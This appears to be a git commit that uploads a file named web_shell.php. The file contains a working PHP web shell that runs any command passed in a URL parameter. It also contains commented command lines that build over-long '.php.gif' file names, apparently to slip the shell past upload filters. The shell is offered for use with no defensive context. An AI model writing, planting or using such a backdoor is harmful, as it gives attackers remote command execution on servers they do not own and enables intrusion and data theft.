664f5223a261bbbf464eb3b16d3b255b73145434
Ahmed Elmohra <73902459+Ahmedelmohra@users.noreply.github.com>
2022-08-14 11:05:08 +0200

    Add files via upload

---
+++ web_shell.php
@@ -0,0 +1,7 @@
+echo <?php system($_GET['cmd']); ?>
+
+<!-- ' > $(python -c 'print("z"*(236-4)+".php"+".gif")')  -->
+<!-- echo '<?php echo system($_GET["cmd"]); ?>  -->
+
+
+<!-- >  $(python -c 'print("A"*(236-4)+".php"+".gif")') -->
